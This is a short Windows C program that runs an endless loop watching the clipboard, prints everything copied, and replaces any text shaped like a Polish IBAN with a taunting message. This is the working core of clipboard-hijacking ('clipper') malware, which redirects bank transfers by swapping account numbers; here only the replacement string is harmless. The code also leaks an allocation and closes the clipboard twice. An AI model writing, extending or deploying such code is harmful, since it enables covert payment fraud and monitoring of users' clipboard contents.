#include <windows.h>
#include <stdio.h>
#include <string.h>

int main()
{
    while(1){
        if (OpenClipboard(NULL)) 
        {
            HANDLE hCbMem = GetClipboardData(CF_TEXT);
            if (hCbMem != NULL) 
            {
                char* text_from_clipboard = (char *)GlobalLock(hCbMem);
                if (text_from_clipboard != NULL) {
                    printf("Clipboard data: %s\n", text_from_clipboard);
                    GlobalUnlock(hCbMem);
                    if(strspn(text_from_clipboard, "PL0123456789") == 28)
                    {
                        printf("Found IBAN number: %s\n", text_from_clipboard);
                        HANDLE hGlMem = GlobalAlloc( GHND , ( DWORD ) strlen(text_from_clipboard) + 1) ;
                        const char *newClipboardData = "Why would you paste it???";
                        size_t text_len = strlen(newClipboardData) + 1;
                        HANDLE hNewData = GlobalAlloc(GMEM_MOVEABLE, text_len);
                        char *new_string_pointer = (char *) GlobalLock(hNewData);
                        strcpy(new_string_pointer, newClipboardData);

                        EmptyClipboard();
                        SetClipboardData(CF_TEXT, hNewData);
                        GlobalUnlock(hNewData);
                        printf("New clipboard data: %s\n", newClipboardData);
                        CloseClipboard();
                        
                    }
                }
            }
            CloseClipboard();
        } else {
            printf("Failed to open clipboard.\n");
        }
        Sleep(1000);
    }
    return 0;
}